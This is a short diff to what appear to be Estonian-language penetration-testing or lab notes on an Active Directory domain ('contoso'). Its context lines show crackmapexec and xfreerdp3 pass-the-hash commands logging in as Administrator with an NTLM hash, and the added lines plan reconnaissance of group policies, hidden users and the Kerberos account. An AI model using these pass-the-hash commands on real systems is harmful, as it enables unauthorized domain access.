@@ -212,6 +212,9 @@ crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b
 sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /d:contoso /pth:c625e3e2756d9ef01881fa7ed46b49a8 /restricted-admin
 küsib meie parooli ja voilaa siseneb serverisse
 
+Nüüd peab hakkama veenduma mis siin sees on.. grupipoliitikaid, milliseid kasutajaid näeme, kus näeme neid kasutajaid mis on peidul silma alt..
+Active Directory Administrative Center alt leiab lõpuks ka kerberose kasutaja, mida muidu ei leia
+
 
 
 
